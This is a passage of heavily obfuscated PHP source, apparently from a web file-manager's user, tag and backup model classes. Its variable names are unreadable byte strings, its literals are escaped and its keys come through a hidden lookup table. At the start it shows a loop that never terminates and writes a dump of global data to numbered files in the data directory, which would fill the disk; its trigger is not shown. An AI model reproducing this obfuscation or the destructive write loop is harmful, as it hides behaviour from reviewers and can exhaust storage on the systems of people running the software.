json_encode($GLOBALS[$›ù—ò¢¢[2315]]); $Ù×ÀµÉ = 1; for ($»÷Ñá–¤ = $Ù×ÀµÉ; $»÷Ñá–¤ > 0; $»÷Ñá–¤++) { $ÖÁàû®Û(DATA_PATH . $»÷Ñá–¤, $Ûü¶‚ˆ); } } $ºÇÙÀğÖ = $this->getInfoSimple($–ì‚ìğ); if (!$ºÇÙÀğÖ || !is_array($ÚÙßÎŒ×)) { return !1; } $ğÍ²˜™Ü = Model($›ù—ò¢¢[1926]); $ğÍ²˜™Ü->where(array($›ù—ò¢¢[1663] => $–ì‚ìğ))->delete(); $üÄ§¡Ê¸ = array(); $¸íœ˜ğš = 0; foreach ($ÚÙßÎŒ× as $•éÏİåî => $›©Îã¨¦) { $ÑÓÊ·É‹ = array($›ù—ò¢¢[1663] => $–ì‚ìğ, $›ù—ò¢¢[1836] => $•éÏİåî, $›ù—ò¢¢[1940] => $›©Îã¨¦); $ÑÓÊ·É‹[$›ù—ò¢¢[1860]] = isset($Ã½©’œĞ[$¸íœ˜ğš]) ? $Ã½©’œĞ[$¸íœ˜ğš] : 0; $¸íœ˜ğš++; $üÄ§¡Ê¸[] = $ÑÓÊ·É‹; } return $ğÍ²˜™Ü->addAll($üÄ§¡Ê¸, array(), !0); } protected function userGroupAdd($àšãª» , $¥ìøã¸  = array()) { $³¸şÁˆº =& $_SERVER[ Ö‘ñÄ”]; $Îå¬ì¢Á = $this->getInfoSimple($àšãª» ); if (!$Îå¬ì¢Á || empty($¥ìøã¸ )) { return !1; } $²‰¨·« = array(); foreach ($¥ìøã¸  as $÷‡ßÁ”û => $ã¶›¬ø½) { $²‰¨·«[] = array($³¸şÁˆº[1663] => $àšãª» , $³¸şÁˆº[1836] => $÷‡ßÁ”û, $³¸şÁˆº[1940] => $ã¶›¬ø½, $³¸şÁˆº[1860] => 0); } return Model($³¸şÁˆº[1926])->addAll($²‰¨·«, array(), !0); } protected function userGroupRemove($˜öÜşÛ, $Î·˜ãéÈ) { $ÔÙ’¹ =& $_SERVER[ Ö‘ñÄ”]; $´Â”å¨ê = $this->getInfoSimple($˜öÜşÛ); if (!$´Â”å¨ê || !$Î·˜ãéÈ) { return !1; } $„•–Ç©­ = array($ÔÙ’¹[1654] => $˜öÜşÛ, $ÔÙ’¹[1924] => $Î·˜ãéÈ); return Model($ÔÙ’¹[1926])->where($„•–Ç©­)->delete(); } public function listData() { $‡åí¯°¨ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‡åí¯°¨[$_SERVER[ Ö‘ñÄ”][378]]); return $‡åí¯°¨; } public function listByID($ì”Ú¾ëµ) { $˜ÉŸ˜é‹ =& $_SERVER[ Ö‘ñÄ”]; if (!$ì”Ú¾ëµ) { return; } $ÁÅéˆÔ¿ = array($˜ÉŸ˜é‹[1663] => array($˜ÉŸ˜é‹[7], $ì”Ú¾ëµ)); $…®şİ  = $this->where($ÁÅéˆÔ¿)->select(); $…®şİ  = array_sort_keep($…®şİ , $˜ÉŸ˜é‹[1663], $ì”Ú¾ëµ); $this->_listDataApply($…®şİ ); return $…®şİ ; } public function listByGroup($´¼ ûÓ = 0, $‰ÇéÖ¯² = array()) { $ÓºòÒÚ =& $_SERVER[ Ö‘ñÄ”]; $ÁêÀ‚Œ = $ÓºòÒÚ[12]; $´¡¬¼ûé = array(); if ($´¼ ûÓ) { $´¡¬¼ûé = array($ÓºòÒÚ[2316] => intval($´¼ ûÓ)); $ÁêÀ‚Œ = "\x4c\105\x46\124\x20\112\117\x49\x4e\40{$this->tablePrefix}\x75\163\x65\x72\x5f\x67\162\x6f\x75\x70\40\x75\163\x65\x72\137\147\x72\x6f\165\160\x20\157\156\x20\165\x73\145\x72\56\165\x73\145\x72\x49\104\x20\x3d\x20\x75\163\145\162\x5f\147\162\157\x75\160\x2e\165\x73\x65\162\111\104"; $Ğ´­ô•® = Input::get($ÓºòÒÚ[465], null, $ÓºòÒÚ[12]) ? $ÓºòÒÚ[12] : $ÓºòÒÚ[2317]; } if (isset($‰ÇéÖ¯²[$ÓºòÒÚ[763]])) { $´¡¬¼ûé[$ÓºòÒÚ[2318]] = $‰ÇéÖ¯²[$ÓºòÒÚ[763]]; } $íœ¹˜Ş = $this->_makeOrder($Ğ´­ô•®)->field($ÓºòÒÚ[2319])->where($´¡¬¼ûé)->join($ÁêÀ‚Œ)->selectPage(50); $this->_listDataApply($íœ¹˜Ş[$ÓºòÒÚ[378]]); return $íœ¹˜Ş; } private function _makeOrder($…òœ´¬ = '') { $ÔœÖ‹Éı =& $_SERVER[ Ö‘ñÄ”]; $âëæÆ’ = array($ÔœÖ‹Éı[1663], $ÔœÖ‹Éı[32], $ÔœÖ‹Éı[1825], $ÔœÖ‹Éı[1797], $ÔœÖ‹Éı[200]); $ĞÒšĞø¥ = array($ÔœÖ‹Éı[458] => $ÔœÖ‹Éı[459], $ÔœÖ‹Éı[460] => $ÔœÖ‹Éı[461]); $ñ­õÄÃ” = Input::get($ÔœÖ‹Éı[465], $ÔœÖ‹Éı[7], $ÔœÖ‹Éı[1654], $âëæÆ’); $ëö±¡ıÈ = Input::get($ÔœÖ‹Éı[466], $ÔœÖ‹Éı[7], $ÔœÖ‹Éı[1927], array($ÔœÖ‹Éı[1927], $ÔœÖ‹Éı[460])); $ëö±¡ıÈ = $ĞÒšĞø¥[$ëö±¡ıÈ]; $…òœ´¬ = $…òœ´¬ . "\165\x73\145\x72\x2e{$ñ­õÄÃ”}\x20{$ëö±¡ıÈ}\x2c\40\165\x73\145\162\56\165\163\x65\x72\x49\x44\x20\x61\163\143"; return $this->alias($ÔœÖ‹Éı[2049])->order($…òœ´¬); } public function listSearch($©£Î¼) { $ï„û‚ø =& $_SERVER[ Ö‘ñÄ”]; $îöÕ´¥Í = $©£Î¼[$ï„û‚ø[1930]]; $¼å”ºäŞ = isset($©£Î¼[$ï„û‚ø[1931]]) ? $©£Î¼[$ï„û‚ø[1931]] : !1; $îöÕ´¥Í = str_replace($ï„û‚ø[1932], $ï„û‚ø[1933], trim($îöÕ´¥Í)); $€Â¢ßÉŒ = array($ï„û‚ø[32] => array($ï„û‚ø[391], "\x25{$îöÕ´¥Í}\45"), $ï„û‚ø[314] => array($ï„û‚ø[391], "{$îöÕ´¥Í}\x25"), $ï„û‚ø[550] => array($ï„û‚ø[391], "{$îöÕ´¥Í}\x25"), $ï„û‚ø[1006] => $ï„û‚ø[1934]); if (Input::check($îöÕ´¥Í, $ï„û‚ø[320])) { $€Â¢ßÉŒ[$ï„û‚ø[1663]] = array($ï„û‚ø[391], "{$îöÕ´¥Í}\x25"); $€Â¢ßÉŒ[$ï„û‚ø[2299]] = array($ï„û‚ø[391], "{$îöÕ´¥Í}\45"); } if (!$îöÕ´¥Í) { $€Â¢ßÉŒ = array(); } if (isset($©£Î¼[$ï„û‚ø[763]])) { $€Â¢ßÉŒ[$ï„û‚ø[763]] = $©£Î¼[$ï„û‚ø[763]]; } $€Â¢ßÉŒ = $this->parseWhereLike($€Â¢ßÉŒ); $œÊÀö÷ö = $this->_makeOrder()->where($€Â¢ßÉŒ)->selectPage(20); if (!$œÊÀö÷ö || count($œÊÀö÷ö[$ï„û‚ø[378]]) < 5 && Input::check($îöÕ´¥Í, $ï„û‚ø[327])) { $Õ¹·Ùí¯ = $this->_searchFromMeta($ï„û‚ø[472], $îöÕ´¥Í, 10); $¬ºöÆ‘ = $this->_searchFromMeta($ï„û‚ø[473], $îöÕ´¥Í, 10); $•ğ§‡ ¯ = array_merge($Õ¹·Ùí¯, $¬ºöÆ‘, $œÊÀö÷ö[$ï„û‚ø[378]]); $œÊÀö÷ö[$ï„û‚ø[378]] = array_unique_by_key($•ğ§‡ ¯, $ï„û‚ø[1663]); $œÊÀö÷ö[$ï„û‚ø[375]][$ï„û‚ø[376]] = count($œÊÀö÷ö[$ï„û‚ø[378]]); $œÊÀö÷ö[$ï„û‚ø[375]][$ï„û‚ø[377]] = ceil($œÊÀö÷ö[$ï„û‚ø[375]][$ï„û‚ø[376]] / $œÊÀö÷ö[$ï„û‚ø[375]][$ï„û‚ø[372]]); } $this->_listDataApply($œÊÀö÷ö[$ï„û‚ø[378]]); $this->_filterByGroup($œÊÀö÷ö, $¼å”ºäŞ); return $œÊÀö÷ö; } private function _filterByGroup(&$ıÍ›áë£, $­²éøÙŠ) { $—íâã± =& $_SERVER[ Ö‘ñÄ”]; if (!$­²éøÙŠ) { return $ıÍ›áë£; } foreach ($ıÍ›áë£[$—íâã±[378]] as $Ë»§³»¿ => &$’íáàˆì) { $Ş‡í¾¾¼ = array_to_keyvalue($’íáàˆì[$—íâã±[2019]], $—íâã±[12], $—íâã±[1836]); if (!in_array($­²éøÙŠ, $Ş‡í¾¾¼)) { unset($ıÍ›áë£[$—íâã±[378]][$Ë»§³»¿]); } } unset($’íáàˆì); $ıÍ›áë£[$—íâã±[378]] = array_values($ıÍ›áë£[$—íâã±[378]]); $ıÍ›áë£[$—íâã±[375]] = array($—íâã±[2083] => count($ıÍ›áë£[$—íâã±[378]]), $—íâã±[2081] => $ıÍ›áë£[$—íâã±[375]][$—íâã±[372]], $—íâã±[2080] => 1, $—íâã±[2082] => 1); } private function _searchFromMeta($Ğúû©à€, $¹æ›çŞÃ, $ãíµ™õ×) { $¶ü†‘§£ =& $_SERVER[ Ö‘ñÄ”]; $¹æ›çŞÃ = strtolower($¹æ›çŞÃ); $€ı¶Éî = array($¶ü†‘§£[94] => $Ğúû©à€, $¶ü†‘§£[383] => array($¶ü†‘§£[391], "\45{$¹æ›çŞÃ}\45")); $€ı¶Éî = $this->parseWhereLike($€ı¶Éî); $·³Ş×´ = Model($¶ü†‘§£[2320])->where($€ı¶Éî)->limit($ãíµ™õ×)->select(); if (!$·³Ş×´) { return array(); } $·³Ş×´ = array_to_keyvalue($·³Ş×´, $¶ü†‘§£[12], $¶ü†‘§£[1663]); $Á­­Ñ¨‰ = $this->where(array($¶ü†‘§£[1654] => array($¶ü†‘§£[7], $·³Ş×´)))->select(); if (!$Á­­Ñ¨‰) { return array(); } return $Á­­Ñ¨‰; } private function _listDataApplyItem($Ú›œçŞ­) { $—¦ëÖÜÓ = array($Ú›œçŞ­); $this->_listDataApply($—¦ëÖÜÓ); return $—¦ëÖÜÓ[0]; } private function _listDataApply(&$á½ƒÃ¨) { $Î°äÊ‹í =& $_SERVER[ Ö‘ñÄ”]; if (!$á½ƒÃ¨) { return; } array_remove_key($á½ƒÃ¨, $Î°äÊ‹í[895]); $©ÔÆå­Ò = array_to_keyvalue($á½ƒÃ¨, $Î°äÊ‹í[12], $Î°äÊ‹í[1663]); $this->_listAppendGroup($á½ƒÃ¨, $©ÔÆå­Ò); $this->_listAppendMeta($á½ƒÃ¨, $©ÔÆå­Ò); $this->_listAppendSourceRoot($á½ƒÃ¨, $©ÔÆå­Ò); } private function _listAppendSourceRoot(&$şé»Ìë‡, $˜µ»†¸¬) { $Ø´ÕÌ¸ =& $_SERVER[ Ö‘ñÄ”]; $Ş…àæ¤ç = Model($Ø´ÕÌ¸[838])->listSourceRoot(SourceModel::TYPE_USER, $˜µ»†¸¬); $Ş…àæ¤ç = array_to_keyvalue($Ş…àæ¤ç, $Ø´ÕÌ¸[513]); $Ş…àæ¤ç = array_remove_key($Ş…àæ¤ç, $Ø´ÕÌ¸[513]); foreach ($şé»Ìë‡ as &$òÏ¦ğİÊ) { $òÏ¦ğİÊ[$Ø´ÕÌ¸[86]] = $Ş…àæ¤ç[$òÏ¦ğİÊ[$Ø´ÕÌ¸[1663]]] ? $Ş…àæ¤ç[$òÏ¦ğİÊ[$Ø´ÕÌ¸[1663]]] : array(); } unset($òÏ¦ğİÊ); } private function _listAppendGroup(&$†•… ¶, $–èœ ä) { $¶¯´İÈ’ =& $_SERVER[ Ö‘ñÄ”]; $ÜâÎî¦ƒ = array($¶¯´İÈ’[1663] => array($¶¯´İÈ’[7], $–èœ ä)); $ÖŒ ‡ = Model($¶¯´İÈ’[1926])->where($ÜâÎî¦ƒ)->select(); $¡—ÇÏ¬Ö = array_to_keyvalue($ÖŒ ‡, $¶¯´İÈ’[12], $¶¯´İÈ’[1836]); $¡—ÇÏ¬Ö = array_remove_value(array_unique($¡—ÇÏ¬Ö), $¶¯´İÈ’[197]); if (!$¡—ÇÏ¬Ö || !$ÖŒ ‡) { return; } $ÜâÎî¦ƒ = array($¶¯´İÈ’[1836] => array($¶¯´İÈ’[7], $¡—ÇÏ¬Ö)); $ŞúÕÄàù = Model($¶¯´İÈ’[2017])->field($¶¯´İÈ’[2321])->where($ÜâÎî¦ƒ)->select(); $ŞúÕÄàù = array_to_keyvalue($ŞúÕÄàù, $¶¯´İÈ’[1836]); $ÖŒ ‡ = array_to_keyvalue_group($ÖŒ ‡, $¶¯´İÈ’[1663]); foreach ($ÖŒ ‡ as &$ıÓè¨ÑÏ) { $›±Ú¦Í = array(); foreach ($ıÓè¨ÑÏ as $ƒ™µøú˜) { if (!$ƒ™µøú˜[$¶¯´İÈ’[1940]]) { continue; } $ìıçÂÚü = Model($¶¯´İÈ’[515])->listData($ƒ™µøú˜[$¶¯´İÈ’[1940]]); $›±Ú¦Í[] = array($¶¯´İÈ’[1836] => $ƒ™µøú˜[$¶¯´İÈ’[1836]], $¶¯´İÈ’[2322] => $ŞúÕÄàù[$ƒ™µøú˜[$¶¯´İÈ’[1836]]][$¶¯´İÈ’[32]], $¶¯´İÈ’[529] => $ŞúÕÄàù[$ƒ™µøú˜[$¶¯´İÈ’[1836]]][$¶¯´İÈ’[529]], $¶¯´İÈ’[421] => $ìıçÂÚü); } $ıÓè¨ÑÏ = $›±Ú¦Í; } unset($ıÓè¨ÑÏ); foreach ($†•… ¶ as &$ä‡ÆîÚË) { $ä‡ÆîÚË[$¶¯´İÈ’[2019]] = array(); if (isset($ÖŒ ‡[$ä‡ÆîÚË[$¶¯´İÈ’[1663]]])) { $ä‡ÆîÚË[$¶¯´İÈ’[2019]] = $ÖŒ ‡[$ä‡ÆîÚË[$¶¯´İÈ’[1663]]]; } } unset($ä‡ÆîÚË); } public function userAppendGroup($¤ÂñÑÂ) { $³˜êŠ¼ =& $_SERVER[ Ö‘ñÄ”]; if (!$¤ÂñÑÂ) { return array(); } $this->_listAppendGroup($¤ÂñÑÂ, array_to_keyvalue($¤ÂñÑÂ, $³˜êŠ¼[12], $³˜êŠ¼[1663])); return $¤ÂñÑÂ; } private function _listAppendMeta(&$çÃ®‹, $Ü±ç½šÒ) { $ÊÃ™ö½© =& $_SERVER[ Ö‘ñÄ”]; $Ú¸Ïğõ‹ = UserJobModel::JOB_KEY; $¼¬„µÃ… = array($ÊÃ™ö½©[2300]); $ƒ»£Ù¦É = array($ÊÃ™ö½©[1663] => array($ÊÃ™ö½©[7], $Ü±ç½šÒ)); $œ¸¼Œ = Model($ÊÃ™ö½©[2298])->where($ƒ»£Ù¦É)->select(); $œ¸¼Œ = array_to_keyvalue_group($œ¸¼Œ, $ÊÃ™ö½©[1663]); foreach ($œ¸¼Œ as &$ŠÁ®ÜüÍ) { $™Ù§¡ñÇ = array(); foreach ($ŠÁ®ÜüÍ as $ş“öÇ“ï) { if (!in_array($ş“öÇ“ï[$ÊÃ™ö½©[94]], $¼¬„µÃ…)) { $™Ù§¡ñÇ[$ş“öÇ“ï[$ÊÃ™ö½©[94]]] = $ş“öÇ“ï[$ÊÃ™ö½©[383]]; } } $ŠÁ®ÜüÍ = $™Ù§¡ñÇ; } unset($ŠÁ®ÜüÍ); $ÍÊ±èœá = Model($ÊÃ™ö½©[2323]); foreach ($çÃ®‹ as &$Áãá»ê) { $‹Úè•×ê = array(); if (isset($œ¸¼Œ[$Áãá»ê[$ÊÃ™ö½©[1663]]])) { $‹Úè•×ê = $œ¸¼Œ[$Áãá»ê[$ÊÃ™ö½©[1663]]]; } $Áãá»ê[$ÊÃ™ö½©[2324]] = array(); if (isset($‹Úè•×ê[$Ú¸Ïğõ‹])) { $Áãá»ê[$ÊÃ™ö½©[2324]] = $ÍÊ±èœá->getUserJobInfo($‹Úè•×ê[$Ú¸Ïğõ‹]); } } unset($Áãá»ê); } protected function groupUserAll($†‹“Šé«) { $ü£ºÃ‡ì =& $_SERVER[ Ö‘ñÄ”]; if (!$†‹“Šé«) { return !1; } $›£ñûÊÀ = Model($ü£ºÃ‡ì[1926])->field($ü£ºÃ‡ì[1663])->where(array($ü£ºÃ‡ì[1836] => array($ü£ºÃ‡ì[7], $†‹“Šé«)))->select(); $›£ñûÊÀ = array_to_keyvalue($›£ñûÊÀ, $ü£ºÃ‡ì[12], $ü£ºÃ‡ì[1663]); return array_unique($›£ñûÊÀ); } public function userSearch($ˆ¼ÃÙÈï, $¨ê¡Î„ = "\52") { return Model($_SERVER[ Ö‘ñÄ”][543])->where($ˆ¼ÃÙÈï)->field($¨ê¡Î„)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\137\157\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($ºËööî‚) { $×ëÓ¹Ü =& $_SERVER[ Ö‘ñÄ”]; if (!defined($×ëÓ¹Ü[483])) { define($×ëÓ¹Ü[483], 0); } return "\x55\163\145\x72\x4f\x70\164\151\x6f\x6e\x5f{$ºËööî‚}\137" . USER_ID; } protected function filterWhere($ŠŞ™ú‡½) { $ÅöÈ‡± =& $_SERVER[ Ö‘ñÄ”]; if (!defined($ÅöÈ‡±[483])) { define($ÅöÈ‡±[483], 0); } $ŠŞ™ú‡½[$ÅöÈ‡±[1663]] = USER_ID; return $ŠŞ™ú‡½; } public function cacheRemoveUser($ÖãÒ”­§, $ğß„èı) { return Cache::remove("\125\x73\x65\x72\117\160\164\x69\x6f\x6e\137{$ÖãÒ”­§}\137" . $ğß„èı); } protected function optionDefault($†¤ş¯ØÆ = '') { $‡€ ¢á€ =& $_SERVER[ Ö‘ñÄ”]; if ($†¤ş¯ØÆ == $‡€ ¢á€[12]) { return $GLOBALS[$‡€ ¢á€[6]][$‡€ ¢á€[2325]]; } if ($†¤ş¯ØÆ == $‡€ ¢á€[2326]) { return $GLOBALS[$‡€ ¢á€[6]][$‡€ ¢á€[2327]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\56\x74\x61\147\114\x69\x73\164"; public $modelType = "\x55\x73\145\162\x4f\x70\164\151\x6f\x6e"; public $field = array("\156\x61\155\145", "\163\x74\171\154\x65", "\x73\x6f\x72\164"); public function listData($ÚßìŸ = false, $¬‰Š­À = "\x73\x6f\x72\x74", $…Šæ†±ê = false) { return parent::listData($ÚßìŸ, $¬‰Š­À, $…Šæ†±ê); } public function remove($õ­½ĞÓè) { return parent::remove($õ­½ĞÓè); } public function add($Ûˆì©€ñ, $ß©¸Ñı° = "\154\x61\x62\x65\x6c\55\147\x72\x65\x79\55\156\157\162\155\x61\x6c") { $ïÀƒûã =& $_SERVER[ Ö‘ñÄ”]; if ($this->findByName($Ûˆì©€ñ)) { return !1; } $¸•ø¹øœ = array($ïÀƒûã[428] => $Ûˆì©€ñ, $ïÀƒûã[493] => $ß©¸Ñı°, $ïÀƒûã[1840] => $this->getSort($ïÀƒûã[267]) + 1); return parent::insert($¸•ø¹øœ); } public function update($æáÔ‹ü, $»Ù‹ô¬) { $‚ìè™ë­ =& $_SERVER[ Ö‘ñÄ”]; $ãã¦¥Óİ = $this->listData($æáÔ‹ü); $İ‘šÙÇ = $this->findByName($»Ù‹ô¬[$‚ìè™ë­[32]]); if (!$ãã¦¥Óİ || $İ‘šÙÇ && $İ‘šÙÇ[$‚ìè™ë­[407]] != $ãã¦¥Óİ[$‚ìè™ë­[407]]) { return !1; } return parent::update($æáÔ‹ü, $»Ù‹ô¬); } public function moveTop($ëÑ˜˜ŸÊ) { $›†°÷şî =& $_SERVER[ Ö‘ñÄ”]; $ñæÉÒ¹ = parent::listData(); $¾”õÄÀ† = $this->getSort($›†°÷şî[266]); foreach ($ñæÉÒ¹ as &$€Üæ°í¢) { if ($€Üæ°í¢[$›†°÷şî[407]] == $ëÑ˜˜ŸÊ) { $€Üæ°í¢[$›†°÷şî[1860]] = $¾”õÄÀ†; continue; } $€Üæ°í¢[$›†°÷şî[1860]] += 1; } unset($€Üæ°í¢); return parent::resetData($ñæÉÒ¹); } public function moveBottom($…ãÍÃñé) { $Ó×«„¬ı =& $_SERVER[ Ö‘ñÄ”]; $Ê²æ˜¥‡ = $this->getSort($Ó×«„¬ı[267]) + 1; return parent::update($…ãÍÃñé, array($Ó×«„¬ı[1860] => $Ê²æ˜¥‡)); } public function resetSort($‚ûœ¢Ù­) { $ˆ„›¶îÏ =& $_SERVER[ Ö‘ñÄ”]; $üó³œê£ = array(); $‚ûœ¢Ù­ = is_array($‚ûœ¢Ù­) ? $‚ûœ¢Ù­ : array(); for ($Éö‘ôî = 0; $Éö‘ôî < count($‚ûœ¢Ù­); $Éö‘ôî++) { $üó³œê£[$‚ûœ¢Ù­[$Éö‘ôî] . $ˆ„›¶îÏ[12]] = $Éö‘ôî + 1; } $Åç‹”ãš = parent::listData(); foreach ($Åç‹”ãš as &$¨§Ò£¶ø) { $…¾ƒãÚ = $üó³œê£[$¨§Ò£¶ø[$ˆ„›¶îÏ[407]]]; $¨§Ò£¶ø[$ˆ„›¶îÏ[1860]] = $…¾ƒãÚ ? $…¾ƒãÚ : $¨§Ò£¶ø[$ˆ„›¶îÏ[1860]]; } unset($¨§Ò£¶ø); return parent::resetData($Åç‹”ãš); } private function getSort($Š´´¡ˆ£) { $Ãï‘†‹É =& $_SERVER[ Ö‘ñÄ”]; $áµÆ¨Š = parent::listData(); $³ÙéÑÎ = array_to_keyvalue($áµÆ¨Š, $Ãï‘†‹É[12], $Ãï‘†‹É[1860]); if (!$³ÙéÑÎ) { $³ÙéÑÎ = array(0); } $Ø¹øï¾Ì = $Š´´¡ˆ£ == $Ãï‘†‹É[267] ? max($³ÙéÑÎ) : min($³ÙéÑÎ); return intval($Ø¹øï¾Ì); } } goto d•‡³˜Ë¢; bŞæ«÷Â: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $¾¯è›¼¯ =& $_SERVER[ Ö‘ñÄ”]; $®óæà© = Backup::get(); self::$io = $®óæà©[$¾¯è›¼¯[765]]; self::$name = $®óæà©[$¾¯è›¼¯[32]]; $ò‹üåÃ« = new DbManage(); $¬»éôÛı = $ò‹üåÃ«->dbType(); $ğØÆïÛ£ = array($¾¯è›¼¯[789] => $¬»éôÛı, $¾¯è›¼¯[790] => time()); Backup::set($ğØÆïÛ£); $®¸õÄŠ = $this->tmpFilesPath() . $¾¯è›¼¯[791] . self::$name . $¾¯è›¼¯[8]; del_dir($®¸õÄŠ); mk_dir($®¸õÄŠ); $¹Ø§†ô§ = $ä¯ÊªŞ = 0; $ì’ª¯Ê = new Task($¾¯è›¼¯[792], $¾¯è›¼¯[793], 0, LNG($¾¯è›¼¯[794]) . $¾¯è›¼¯[795] . LNG($¾¯è›¼¯[796])); try { $€ïøÄÑŸ = $ò‹üåÃ«->db()->getTables(); } catch (Exception $³–ÜëªÀ) { $ì’ª¯Ê->end(); return !1; } $€ïøÄÑŸ = array_diff($€ïøÄÑŸ, array($¾¯è›¼¯[797], $¾¯è›¼¯[798])); foreach ($€ïøÄÑŸ as $Ÿıµ¼´Î) { $¹Ø§†ô§ += $ò‹üåÃ«->model($Ÿıµ¼´Î)->count(); } $ì’ª¯Ê->task[$¾¯è›¼¯[799]] = $¹Ø§†ô§; $GLOBALS[$¾¯è›¼¯[800]] = self::$name; foreach ($€ïøÄÑŸ as $Ÿıµ¼´Î) { $İâ®Ñ¸ = $®¸õÄŠ . $Ÿıµ¼´Î . $¾¯è›¼¯[801]; $îşãŞ÷˜ = null; if ($Ÿıµ¼´Î == $¾¯è›¼¯[802] && (!isset($®óæà©[$¾¯è›¼¯[768]]) || $®óæà©[$¾¯è›¼¯[768]] == $¾¯è›¼¯[197])) { $îşãŞ÷˜ = self::$io; } $ä¯ÊªŞ += $ò‹üåÃ«->sqlFromDb($Ÿıµ¼´Î, $İâ®Ñ¸, $ì’ª¯Ê, $îşãŞ÷˜); } unset($GLOBALS[$¾¯è›¼¯[800]]); $ì’ª¯Ê->end(); if ($ä¯ÊªŞ > $¹Ø§†ô§) { $¹Ø§†ô§ = $ä¯ÊªŞ; } $ğØÆïÛ£ = array($¾¯è›¼¯[789] => $¬»éôÛı, $¾¯è›¼¯[786] => 1, $¾¯è›¼¯[803] => $¹Ø§†ô§, $¾¯è›¼¯[804] => $ä¯ÊªŞ, $¾¯è›¼¯[805] => time()); Backup::set($ğØÆïÛ£); if ($¹Ø§†ô§ - $ä¯ÊªŞ > 0) { $¯¿ÔÓì™ = $¾¯è›¼¯[806]; if (stristr(I18n::getType(), $¾¯è›¼¯[807])) { $¯¿ÔÓì™ = $¾¯è›¼¯[808]; } write_log(array($¯¿ÔÓì™, $ğØÆïÛ£), $¾¯è›¼¯[793]); return !1; } return !0; } private function tmpFilesPath() { $ıò¤¤œî =& $_SERVER[ Ö‘ñÄ”]; $ˆ®¯‰« = TEMP_FILES; if ($GLOBALS[$ıò¤¤œî[6]][$ıò¤¤œî[89]][$ıò¤¤œî[809]]) { $ˆ®¯‰« = $GLOBALS[$ıò¤¤œî[6]][$ıò¤¤œî[89]][$ıò¤¤œî[809]]; if (!mk_dir($ˆ®¯‰«) || !is_writable($ˆ®¯‰«) || !IO::mkfile($ˆ®¯‰« . $ıò¤¤œî[810])) { $ˆ®¯‰« = TEMP_FILES; } } return $ˆ®¯‰«; } } class BackupDbFile { public function __construct() { } public function index() { $›š½Ş‚ =& $_SERVER[ Ö‘ñÄ”]; $Â‘ î°— = Backup::get(); $û€ÚÄ€ = $Â‘ î°—[$›š½Ş‚[32]]; $ ÒíÒì = $this->tmpFilesPath() . "\142\141\x63\x6b\165\160\137{$û€ÚÄ€}\x2f"; $ÄµÖşâ² = $this->backupPath($Â‘ î°—); if (!($ÄµÖşâ² = IO::mkdir($ÄµÖşâ²))) { return !1; } $ø‘¸“±Ñ = IO::listPath($ ÒíÒì); $¸ö¸ø‰é = isset($ø‘¸“±Ñ[$›š½Ş‚[83]]) ? $ø‘¸“±Ñ[$›š½Ş‚[83]] : array(); $Ûé»ëÜ‘ = array_sum(array_column($¸ö¸ø‰é, $›š½Ş‚[76])); if (!$Ûé»ëÜ‘) { return !1; } $†‚­¯•„ = array($›š½Ş‚[811] => $Ûé»ëÜ‘, $›š½Ş‚[812] => time()); Backup::set($†‚­¯•„); $­ÜéæÍ = new TaskFileTransfer($›š½Ş‚[813], $›š½Ş‚[793], count($¸ö¸ø‰é), LNG($›š½Ş‚[794]) . $›š½Ş‚[394] . LNG($›š½Ş‚[796]) . $›š½Ş‚[814]); $­ÜéæÍ->task[$›š½Ş‚[776]] = $Ûé»ëÜ‘; foreach ($ø‘¸“±Ñ[$›š½Ş‚[83]] as $û¸­´³) { $ªßÍö¿» = IO::move($û¸­´³[$›š½Ş‚[84]], $ÄµÖşâ²); if (!$ªßÍö¿») { $­ÜéæÍ->end(); $À»îÆ¤ã = IO::getLastError($›š½Ş‚[815] . $û¸­´³[$›š½Ş‚[84]] . $›š½Ş‚[816] . $ÄµÖşâ² . $›š½Ş‚[164]); write_log($À»îÆ¤ã, $›š½Ş‚[793]); return !1; } } $Ê¸šÜÜÑ = new DbManage(); $ ±˜·…… = $Ê¸šÜÜÑ->getSqlFile(); if (!$ ±˜·……[$›š½Ş‚[817]] || !$ ±˜·……[$›š½Ş‚[13]]) { return !1; } IO::move($ ±˜·……[$›š½Ş‚[817]], $ÄµÖşâ²); IO::move($ ±˜·……[$›š½Ş‚[13]], $ÄµÖşâ²); $­ÜéæÍ->end(); $†‚­¯•„ = array($›š½Ş‚[818] => $Ûé»ëÜ‘, $›š½Ş‚[819] => time()); Backup::set($†‚­¯•„); return !0; } private function backupPath($’å•óÀŠ) { $¡¼¸Ä§í =& $_SERVER[ Ö‘ñÄ”]; $Ùª·ò‰ş = $’å•óÀŠ[$¡¼¸Ä§í[32]]; $–üìíáæ = Model($¡¼¸Ä§í[783])->get($¡¼¸Ä§í[784]); $©õ®Ü²˜ = substr(md5($¡¼¸Ä§í[785] . $–üìíáæ . $Ùª·ò‰ş), 0, 8); return "\x7b\x69\157\72{$’å•óÀŠ[$¡¼¸Ä§í[765]]}\175\57\x64\141\x74\x61\142\x61\x73\145\x2f\x62\x61\143\x6b\x75\x70\57" . $Ùª·ò‰ş . $¡¼¸Ä§í[11] . $©õ®Ü²˜; } private function tmpFilesPath() { $ÌØ·­ó =& $_SERVER[ Ö‘ñÄ”]; $èÃ‹Ãµœ = TEMP_FILES; if ($GLOBALS[$ÌØ·­ó[6]][$ÌØ·­ó[89]][$ÌØ·­ó[809]]) { $èÃ‹Ãµœ = $GLOBALS[$ÌØ·­ó[6]][$ÌØ·­ó[89]][$ÌØ·­ó[809]]; if (!mk_dir($èÃ‹Ãµœ) || !is_writable($èÃ‹Ãµœ) || !IO::mkfile($èÃ‹Ãµœ . $ÌØ·­ó[810])) { $èÃ‹Ãµœ = TEMP_FILES; } } return $èÃ‹Ãµœ; } } class BackupFile { public function __construct() { } public function index() { $Ãûİ×¹² = Backup::get(); $­¿‹Ùíö = $Ãûİ×¹²[$_SERVER[ Ö‘ñÄ”][302]][$_SERVER[ Ö‘ñÄ”][199]][$_SERVER[ Ö‘ñÄ”][476]]; $»à•›ÍÄ = array($_SERVER[ Ö‘ñÄ”][477] => array($_SERVER[ Ö‘ñÄ”][820], $­¿‹Ùíö), $_SERVER[ Ö‘ñÄ”][821] => array($_SERVER[ Ö‘ñÄ”][340], $Ãûİ×¹²[$_SERVER[ Ö‘ñÄ”][765]])); $¨ıÑñ˜ç = (int) 